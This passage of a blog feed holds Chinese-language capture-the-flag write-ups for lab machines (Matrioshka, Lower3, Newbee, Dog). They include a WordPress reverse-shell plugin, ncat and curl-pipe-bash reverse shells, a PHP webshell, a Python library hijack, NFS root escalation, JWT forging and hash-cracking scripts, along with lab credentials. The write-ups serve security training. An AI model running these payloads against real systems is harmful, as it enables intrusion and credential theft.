/ /_/ / /__/ / __/ /\r/_/ /_/\\__,_/\\___/_/\\___/_/ v3.3.9\rprojectdiscovery.io\r[INF] Current nuclei version: v3.3.9 (outdated)\r[INF] Current nuclei-templates version: v10.1.3 (latest)\r[WRN] Scan results upload to cloud is disabled.\r[INF] New templates added in latest release: 52\r[INF] Templates loaded for current scan: 7707\r[INF] Executing 7518 signed templates from projectdiscovery/nuclei-templates\r[WRN] Loading 189 unsigned templates for scan. Use with caution.\r[INF] Targets loaded for current scan: 1\r[INF] Templates clustered: 1706 (Reduced 1603 Requests)\r[INF] Using Interactsh Server: oast.site\r[CVE-2024-27956] [http] [critical] http://mamushka.hmv/wp-content/plugins/wp-automatic/inc/csv.php\r[wordpress-login] [http] [info] http://mamushka.hmv/wp-login.php\r[tech-detect:font-awesome] [http] [info] http://mamushka.hmv/\r[tech-detect:php] [http] [info] http://mamushka.hmv/\r[addeventlistener-detect] [http] [info] http://mamushka.hmv/\r[apache-detect] [http] [info] http://mamushka.hmv/ [\u0026#34;Apache/2.4.61 (Debian)\u0026#34;]\r[php-detect] [http] [info] http://mamushka.hmv/ [\u0026#34;8.2.22\u0026#34;]\r[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14\r[wordpress-detect] [http] [info] http://mamushka.hmv/\r[wp-enabled-registration] [http] [info] http://mamushka.hmv/?page_id=14\r[wp-user-enum:usernames] [http] [low] http://mamushka.hmv/?rest_route=/wp/v2/users/ [\u0026#34;admin\u0026#34;]\r[http-missing-security-headers:strict-transport-security] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:content-security-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:permissions-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-frame-options] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-content-type-options] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:referrer-policy] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:clear-site-data] [http] [info] http://mamushka.hmv/\r[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://mamushka.hmv/\r[mixed-passive-content:img] [http] [info] http://mamushka.hmv/ [\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/mamushka-1.jpg\u0026#34;,\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/OIG5-1.jpeg\u0026#34;,\u0026#34;http://mamushka.htb/wp-content/uploads/2024/08/OIG4.jpeg\u0026#34;]\r[caa-fingerprint] [dns] [info] mamushka.hmv 可以看到存在CVE-2024-27956漏洞\nCVE-2024-27956-RCE #\r下载脚本\ndiego-tella/CVE-2024-27956-RCE: PoC for SQL Injection in CVE-2024-27956 登录来到后台\n我本来想到官方插件市场上下载一个压缩包，然后上传，不知道为什么在其他靶机上可以成功，这里不行。这个wordpress实在是太卡了！！！\n找了个其他的webshell代码进行压缩上传\n\u0026lt;?php\r/**\r* Plugin Name: Reverse Shell Plugin\r* Plugin URI: * Description: Reverse Shell Plugin for penetration testing.\r* Version: 1.0\r* Author: Security Analyst\r* Author URI: http://www.example.com\r*/\rexec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.104/6666 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);\r?\u0026gt; 压缩成zip文件\n[root@kali] /home/kali/Matrioshka ❯ zip webshell.zip webshell.php adding: webshell.php (deflated 28%) 上传后，先监听端口，再激活插件\nUser #\r发现存在docker容器\n很明显，当前的wordpress是开在docker容器中的，把内网的80端口映射到了主机上\n在linpeas输出中得到了wordpress的用户密码\n这里需要注意的是，用户名中少了一个 h !!!! 对比网站标题mamushka才知道。\nmatrioshka:Fukurokuju Root #\r发现许多张网卡\ndefault 0.0.0.0 loopback 127.0.0.0\rlink-local 169.254.0.0\rbr-1f21cf17cc68: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255\rinet6 fe80::42:37ff:fe92:1872 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:37:92:18:72 txqueuelen 0 (Ethernet)\rRX packets 546310 bytes 191597700 (182.7 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 493766 bytes 626392335 (597.3 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rbr-4472ca9b655b: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 172.19.0.1 netmask 255.255.0.0 broadcast 172.19.255.255\rinet6 fe80::42:4dff:fe92:8a5a prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 02:42:4d:92:8a:5a txqueuelen 0 (Ethernet)\rRX packets 3648 bytes 215213 (210.1 KiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 3948 bytes 380378 (371.4 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rdocker0: flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500\rinet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255\rether 02:42:92:43:dd:58 txqueuelen 0 (Ethernet)\rRX packets 0 bytes 0 (0.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 0 bytes 0 (0.0 B)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\renp0s3: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet 192.168.56.108 netmask 255.255.255.0 broadcast 192.168.56.255\rinet6 fe80::a00:27ff:fed5:7c4c prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 08:00:27:d5:7c:4c txqueuelen 1000 (Ethernet)\rRX packets 1187558 bytes 620318374 (591.5 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 862178 bytes 196392172 (187.2 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rlo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536\rinet 127.0.0.1 netmask 255.0.0.0\rinet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt;\rloop txqueuelen 1000 (Local Loopback)\rRX packets 1029733 bytes 792434531 (755.7 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 1029733 bytes 792434531 (755.7 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rveth011424f: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::d06a:28ff:fe1f:c382 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether d2:6a:28:1f:c3:82 txqueuelen 0 (Ethernet)\rRX packets 143651 bytes 269370121 (256.8 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 168239 bytes 25584006 (24.3 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rveth79812d4: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::d85a:deff:fe35:2d7 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether da:5a:de:35:02:d7 txqueuelen 0 (Ethernet)\rRX packets 8 bytes 565 (565.0 B)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 17 bytes 1539 (1.5 KiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0\rvethd4425c2: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500\rinet6 fe80::8c9a:93ff:fe89:f449 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt;\rether 8e:9a:93:89:f4:49 txqueuelen 0 (Ethernet)\rRX packets 714526 bytes 224828236 (214.4 MiB)\rRX errors 0 dropped 0 overruns 0 frame 0\rTX packets 637430 bytes 895763382 (854.2 MiB)\rTX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 注意\n靶机必须能够访问外网，不然无法正常启动其中的容器！！！！\n上传fscan进行扫描一下，发现172.19.0.2是存活的\n使用socat将其转发出来\nmatrioshka@matrioshka:/tmp$ ./socat tcp-l:4444,fork,reuseaddr tcp:172.19.0.2:80 \u0026amp; 进入后可以使用弱口令admin:admin进行登录，进入管理面板查看到系统版本\nhfs 0.52.9 vulnerabilities | Snyk\ntruonghuuphuc/CVE-2024-39943-Poc\n将**/tmp**目录设置为任何人可以操作\n如图执行后会在**/tmp**目录下生成一个文件\n但是无法接收到反弹Shell，解码base64后发现可能是目标无法访问到外网。\nbmNhdCAxNzIuMjAuMTgyLjEwNyA2NjY2IC1lIC9iaW4vYmFzaA==\rncat 172.20.182.107 6666 -e /bin/bash 因此可以换一种方式\ncurl 172.19.0.1:3000\rY3VybCAxNzIuMTkuMC4xOjMwMDA= 同时在POC代码中可以注意到他最后访问了一个这样的路径\n之前开放了Anyone可操作，这里访问之前必须重命名保存之后才行！！！\n因此只需要访问如下路径即可\nhttp://172.20.189.150:4444/~/api/get_ls?path=/tmp/\u0026lt;payload\u0026gt; 在进行反弹shell之前，需要上传一个shell.sh，可以使用wget传上去\nwget 172.19.0.1:8000/shell.sh -O /tmp/shell.sh\rd2dldCAxNzIuMTkuMC4xOjgwMDAvc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaA== 然后反弹shell\nbash /tmp/shell.sh\rYmFzaCAvdG1wL3NoZWxsLnNo 查看存在的docker容器\nroot@40b85800163c:/tmp# docker ps -a\rdocker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r40b85800163c ubuntu:20.04 \u0026#34;/bin/bash -c \u0026#39;apt-g…\u0026#34; 2 hours ago Up 2 hours 127.0.0.1:9090-\u0026gt;80/tcp docker-hfs_hfs_1\r8485358c3c48 mysql:8.0.0 \u0026#34;docker-entrypoint.s…\u0026#34; 6 months ago Up 2 hours 3306/tcp docker-wp_db_1\r3ed5ddfe0e0c wordpress \u0026#34;docker-entrypoint.s…\u0026#34; 6 months ago Up 2 hours 127.0.0.1:8080-\u0026gt;80/tcp docker-wp_wordpress_1 查找可以利用的命令\n这里如果是直接在反弹shell里运行的话会TTY报错，只需要script /dev/null开启伪终端即可\nSummary #\rUser：通过WPscan和Nuclei扫描出来任意用户注册的漏洞，通过上传wp插件获得反弹shell，在环境变量里得到ssh的登录凭证。\nRoot：使用fscan对内网网段进行扫描，得到存活的172.19.0.2。通过弱口令登录到后台，查看到服务版本号。经过搜索查找到CVE-2024-39943，脚本并不能直接使用，不过根据代码逻辑可以找到利用的URL路径，艰难地反弹到shell后查看到存在另外几个Docker容器，进入到ubuntu里面拿到root.txt。\n","date":"2025-03-10","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-matrioshka/","section":"Posts","summary":"","title":"HackMyVM-Matrioshka","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Lower3 ❯ nmap 192.168.56.113 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\r| ssh-hostkey: | 3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)\r| 256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)\r|_ 256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-title: Apache2 Debian Default Page: It works\r|_http-server-header: Apache/2.4.56 (Debian)\r111/tcp open rpcbind 2-4 (RPC #100000)\r| rpcinfo: | program version port/proto service\r| 100000 2,3,4 111/tcp rpcbind\r| 100000 2,3,4 111/udp rpcbind\r| 100000 3,4 111/tcp6 rpcbind\r| 100000 3,4 111/udp6 rpcbind\r| 100003 3 2049/udp nfs\r| 100003 3 2049/udp6 nfs\r| 100003 3,4 2049/tcp nfs\r| 100003 3,4 2049/tcp6 nfs\r| 100005 1,2,3 36141/tcp mountd\r| 100005 1,2,3 46793/udp mountd\r| 100005 1,2,3 56285/tcp6 mountd\r| 100005 1,2,3 57285/udp6 mountd\r| 100021 1,3,4 37329/tcp6 nlockmgr\r| 100021 1,3,4 39713/tcp nlockmgr\r| 100021 1,3,4 41715/udp nlockmgr\r| 100021 1,3,4 58173/udp6 nlockmgr\r| 100227 3 2049/tcp nfs_acl\r| 100227 3 2049/tcp6 nfs_acl\r| 100227 3 2049/udp nfs_acl\r|_ 100227 3 2049/udp6 nfs_acl\r2049/tcp open nfs 3-4 (RPC #100003)\r36141/tcp open mountd 1-3 (RPC #100005)\r38315/tcp open mountd 1-3 (RPC #100005)\r39713/tcp open nlockmgr 1-4 (RPC #100021)\r41871/tcp open mountd 1-3 (RPC #100005)\rMAC Address: 08:00:27:C5:C6:B4 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NFS #\r发现了 NFS（Network File System） 共享，可能存在可挂载的远程文件系统。 mountd、nlockmgr、nfs_acl 这些 RPC 端口也被发现，表明服务器可能允许远程文件访问。\n[root@kali] /home/kali ❯ showmount -e 192.168.56.113 ⏎\rExport list for 192.168.56.113:\r/var/www/html * 目标机器通过 NFS（Network File System） 共享了 /var/www/html 目录，并且对所有主机开放挂载权限。\n因此可以上传一个Webshell\n[root@kali] /home/kali ❯ mkdir /mnt/nfs\r[root@kali] /home/kali ❯ mount -t nfs 192.168.56.113:/var/www/html /mnt/nfs\r[root@kali] /mnt/nfs ❯ echo \u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; \u0026gt; shell.php 然后反弹到shell\n直接进入用户目录拿到user.txt\nRoot #\r仍然是通过NFS来提权\n其中no_root_squash配置表示：登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限！\n下面是两个参考的文章\nLinux 提权-NFS 共享 - 扛枪的书生 - 博客园\nLinux提权姿势二：利用NFS提权-腾讯云开发者社区-腾讯云\n首先在low机器上把bash拷贝到当前目录，可以看到当前的拥有者是low\n回到kali，由于我们是由root身份进行挂载的，因此对当前目录来说我们就是root！\n只需要修改一下拥有者，然后赋予启动权限即可。\n最后启动bash -p即可提升到root\nSummary #\r这个靶机比较简单，就是通过NFS来获取到low用户，再通过kali的root挂载，提升到root权限，就不多说了。\n","date":"2025-03-10","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-lower3/","section":"Posts","summary":"","title":"VulNyx-Lower3","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/debian ❯ nmap 192.168.237.155 -sV -A -p- -T4\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 92:6e:6d:b0:bd:08:1e:db:9d:56:0e:f8:15:25:ca:21 (ECDSA)\r|_ 256 88:d7:08:bd:a2:95:75:cc:71:06:47:ae:fd:d3:8b:b9 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: PHPJabbers.com | Free Food Store Website Template\rMAC Address: 00:0C:29:0A:FF:81 (VMware)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ParamScan #\r访问80端口，在网页注释中发现存在GET参数\n使用ffuf对参数进行爆破，发现存在hack参数可以控制，但是并不能包含**/etc/passwd**文件\n[root@kali] /home/kali/debian ❯ ffuf -u \u0026#34;http://192.168.237.155/index.php?FUZZ=1\u0026#34; -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -fs 18852\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.237.155/index.php?FUZZ=1\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 18852\r________________________________________________\rhack [Status: 200, Size: 18864, Words: 6832, Lines: 377, Duration: 43ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:17] :: Errors: 0 :: Gobuster #\r尝试列举网站目录下的其他文件\n[root@kali] /home/kali/debian ❯ gobuster dir -u http://192.168.237.155 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php ===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.237.155\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 280]\r/index.php (Status: 200) [Size: 18852]\r/products.php (Status: 200) [Size: 12163]\r/terms.php (Status: 200) [Size: 6670]\r/assets (Status: 301) [Size: 319] [--\u0026gt; http://192.168.237.155/assets/]\r/testimonials.php (Status: 200) [Size: 7907]\r/contact.php (Status: 200) [Size: 8853]\r/about.php (Status: 200) [Size: 10036]\r/javascript (Status: 301) [Size: 323] [--\u0026gt; http://192.168.237.155/javascript/]\r/checkout.php (Status: 200) [Size: 13307]\r/blog.php (Status: 200) [Size: 9782]\r/secret.php (Status: 200) [Size: 2187]\r/.php (Status: 403) [Size: 280]\r/server-status (Status: 403) [Size: 280]\rProgress: 441120 / 441122 (100.00%)\r===============================================================\rFinished\r=============================================================== Own www-data #\r发现存在secret.php，并且可以通过hack参数包含到index.php当中\n查看secret.php源码，发现只需要设置Cookie就能执行命令\n[root@kali] /home/kali/debian ❯ cat secret.txt|base64 -d ......\r......\r\u0026lt;div class=\u0026#34;console\u0026#34;\u0026gt;\r\u0026lt;div class=\u0026#34;output\u0026#34; id=\u0026#34;output\u0026#34;\u0026gt;\r\u0026lt;?php\rif (isset($_COOKIE[\u0026#39;AreYouAdmin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;AreYouAdmin\u0026#39;] === \u0026#39;Yes\u0026#39;) {\rif (isset($_GET[\u0026#39;command\u0026#39;])) {\r$command = $_GET[\u0026#39;command\u0026#39;];\r$output = shell_exec($command);\recho \u0026#39;\u0026lt;div\u0026gt;\\\u0026gt; \u0026#39; . htmlspecialchars($command) . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;;\recho \u0026#39;\u0026lt;div\u0026gt;\u0026#39; . nl2br(htmlspecialchars($output)) . \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;;\r}\r} else {\recho \u0026#39;\u0026lt;div\u0026gt;No permission to execute commands, lacking admin permission.\u0026lt;/div\u0026gt;\u0026#39;;\r}\r?\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div class=\u0026#34;input-container\u0026#34;\u0026gt;\r\u0026lt;span class=\u0026#34;prompt\u0026#34;\u0026gt;\\\u0026gt;\u0026lt;/span\u0026gt;\r\u0026lt;form method=\u0026#34;get\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;command\u0026#34; id=\u0026#34;input\u0026#34; placeholder=\u0026#34;command...\u0026#34; autocomplete=\u0026#34;off\u0026#34;\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;script\u0026gt;\rconst inputField = document.getElementById(\u0026#34;input\u0026#34;);\rinputField.focus();\r\u0026lt;/script\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; http://192.168.237.155/secret.php?command=curl 192.168.237.147/shell.sh|bash Own debian #\r查看www-data的特殊命令\nwww-data@debian:/var/www/html/shop$ sudo -l\rsudo -l\rMatching Defaults entries for www-data on debian:\renv_reset, mail_badpass,\rsecure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\rtargetpw, use_pty\rUser www-data may run the following commands on debian:\r(debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py 查看vuln.py的具体内容，代码没有任何意义\nwww-data@debian:/var/www/html$ cat vuln.py\rcat vuln.py\rimport random\rimport time\rimport math\rimport string\rimport datetime\rdef generate_random_string(length=10):\rreturn \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=length))\rdef pointless_computation():\rnumber = random.randint(1, 1000)\rresult = math.sqrt(number) * math.log(number)\rprint(f\u0026#34;Calculated math nonsense: sqrt({number}) * log({number}) = {result}\u0026#34;)\rdef simulate_time_wasting():\rnow = datetime.datetime.now()\rprint(f\u0026#34;Started wasting time at {now}\u0026#34;)\rtime.sleep(2) # 故意睡眠 2 秒\rlater = datetime.datetime.now()\rprint(f\u0026#34;Finished wasting time at {later}. Time wasted: {later - now}\u0026#34;)\rdef pointless_string_operations():\rrand_str = generate_random_string()\rprint(f\u0026#34;Generated random string: {rand_str}\u0026#34;)\rreversed_str = rand_str[::-1]\rprint(f\u0026#34;Reversed string: {reversed_str}\u0026#34;)\rprint(f\u0026#34;String length: {len(rand_str)}\u0026#34;)\rif __name__ == \u0026#34;__main__\u0026#34;:\rpointless_computation()\rsimulate_time_wasting()\rpointless_string_operations()\rprint(\u0026#34;All done. The script accomplished nothing useful.\u0026#34;) 不过当前目录是可以写入的\n进行库劫持，修改datetime的代码\nwww-data@debian:/var/www/html$ wget 192.168.237.147/datetime.py\rwget 192.168.237.147/datetime.py\r--2025-03-08 22:25:21-- http://192.168.237.147/datetime.py\rConnecting to 192.168.237.147:80... connected.\rHTTP request sent, awaiting response... 200 OK\rLength: 88 [text/x-python]\rSaving to: \u0026#39;datetime.py\u0026#39;\r0K 100% 17.5M=0s\r2025-03-08 22:25:21 (17.5 MB/s) - \u0026#39;datetime.py\u0026#39; saved [88/88]\rwww-data@debian:/var/www/html$ cat datetime.py\rcat datetime.py\rimport os\rclass datetime():\rdef now():\ros.system(\u0026#34;/bin/bash -p\u0026#34;) 然后执行sudo，即可获取到debian的权限，可以写入**/home/.ssh/authorized_keys来进行ssh**密钥登录\n登录拿到User.txt\nRoot #\r在**/home/debian**目录下看到另外两个文件\ndebian@debian:~$ cat config.php \u0026lt;?php\r$servername = \u0026#34;localhost\u0026#34;;\r$username = \u0026#34;root\u0026#34;;\r$password = \u0026#34;\r$conn = new mysqli($servername, $username, $password);\r............\r............\rdebian@debian:~$ cat note.txt Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me 查看**/var/www/html/flask/main.py结果没有权限，再查看端口开放了127.0.0.1:5000**\n使用ssh端口转发\n[root@kali] /home/kali ❯ ssh -i ~/.ssh/id_rsa debian@192.168.237.155 -L 5000:127.0.0.1:5000 在网页源码中发现了网站使用的密钥非常简单\n可以任意登录一个用户，比如 123:123，会得到一个token\n进行解密👉JSON Web Tokens - jwt.io\n使用john进行爆破，得到KEY\n可以使用python脚本来生成jwttoken\nimport jwt\rimport datetime\r# 用于加密的密钥\rSECRET_KEY = \u0026#39;noob\u0026#39;\r# 生成JWT的载荷\rpayload = {\r\u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;,\r\u0026#39;exp\u0026#39;: datetime.datetime.utcnow() + datetime.timedelta(hours=1) # 设置过期时间为1小时\r}\r# 使用 pyjwt 加密生成 JWT\rencoded_jwt = jwt.encode(payload, SECRET_KEY, algorithm=\u0026#39;HS256\u0026#39;)\rprint(\u0026#34;Encoded JWT:\u0026#34;, encoded_jwt) 使用burpsuite进行抓包替换token，得到mysql的登录凭证\nMysql account root:ThePasswordYouNeverCracked 在数据库中发现一段哈希值，使用pbkdf2进行加密的\n可以使用下面的脚本进行破解，也可以使用\nimport hashlib\rimport binascii\rdef pbkdf2_hash(password, salt, iterations=50500, dklen=60):\rhash_value = hashlib.pbkdf2_hmac(\r\u0026#39;sha256\u0026#39;,\rpassword.encode(\u0026#39;utf-8\u0026#39;),\rsalt,\riterations,\rdklen\r)\rreturn hash_value\rdef find_matching_password(dictionary_file, target_hash, salt, iterations=50500, dklen=60):\rtarget_hash_bytes = binascii.unhexlify(target_hash)\rwith open(dictionary_file, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as file:\rcount = 0\rfor line in file:\rpassword = line.strip()\rhash_value = pbkdf2_hash(password, salt, iterations, dklen)\rcount += 1\rprint(f\u0026#34;Check {count}: {password}\u0026#34;)\rif hash_value == target_hash_bytes:\rprint(f\u0026#34;\\nFound password: {password}\u0026#34;)\rreturn password\rprint(\u0026#34;Password not found.\u0026#34;)\rreturn None\rsalt = binascii.unhexlify(\u0026#39;8bf3e3452b78544f8bee9400d6936d34\u0026#39;)\rtarget_hash = \u0026#39;2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0\u0026#39;\rdictionary_file = \u0026#39;/usr/share/wordlists/rockyou.txt\u0026#39;\rfind_matching_password(dictionary_file, target_hash, salt) 破解得到密码：1qaz2wsx\n拿到密码后在**/home/debian/.secret**目录下发现一个压缩包\n注意！！！！！\n经过修改后的靶机，这里实际上是MD5直接加密操作，而非异或！！\n进行异或操作，得到压缩包的密码是：mjucwnilynkktf\n将root.zip传到kali里面，解密\n得到的是一张模糊的图片\n这里需要使用到一个工具\nspipm/Depixelization_poc: Depix is a PoC for a technique to recover plaintext from pixelized screenshots. 查看output.png，发现与Github上的相同\n得到root的密码\nroot:hellofromtheotherside Summary #\rUser：通过对参数爆破然后进行文件包含得到secret.php的源代码，设置cookie之后可以反弹到www-data的shell。通过劫持vuln.py的datetime库，将权限提升到了debian。\nRoot：通过debian家目录下的几个文件线索，在127.0.0.1:5000端口上的flask服务中，通过爆破jwt secret key，得到mysql的登录凭证。在mysql中获取到了pbkdf2加密的哈希值，进行爆破得到明文密码。在**/home/debian/.secret/中发现一个加密的zip文件，以及需要进行XOR异或运算的提示。解密后解压root.zip**，得到一张模糊的图片。可以使用Depix工具还原，得到与Github上相同密码是hellofromtheotherside，提升到root权限。\n","date":"2025-03-09","externalUrl":null,"permalink":"/posts/2025/03/hackmyvm-newbee/","section":"Posts","summary":"","title":"HackMyVM-Newbee","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Dog ❯ nmap dog.htb -sV -A -Pn -T4 PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)\r| 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)\r|_ 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)\r80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\r| http-git: | 10.10.11.58:80/.git/\r| Git repository found!\r| Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the...\r|_ Last commit message: todo: customize url aliases. reference:https://docs.backdro...\r|_http-server-header: Apache/2.4.41 (Ubuntu)\r|_http-generator: Backdrop CMS 1 (https://backdropcms.org)\r| http-robots.txt: 22 disallowed entries (15 shown)\r| /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register |_/user/password /user/login /user/logout /?q=admin /?q=comment/reply\r|_http-title: Home | Dog 可以发现nmap直接扫描到了**/.git**目录\nGitDump #\r[root@kali] /home/kali/Dog ❯ git-dumper http://dog.htb/.git/ ./dog-git 由于存在一个登录页面，我们需要寻找到存在的用户：tiffany\n[root@kali] /home/kali/Dog/dog-git (master) ❯ grep -r \u0026#34;@dog.htb\u0026#34;\rfiles/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \u0026#34;tiffany@dog.htb\u0026#34; 查看settings.php中，得到mysql数据库的密码\n[root@kali] /home/kali/Dog/dog-git (master) ❯ head settings.php -n 20\r\u0026lt;?php\r/**\r* @file\r* Main Backdrop CMS configuration file.\r*/\r/**\r* Database configuration:\r*\r* Most sites can configure their database by entering the connection string\r* below. If using primary/replica databases or multiple connections, see the\r* advanced database documentation at\r* https://api.backdropcms.org/database-configuration\r*/\r$database = 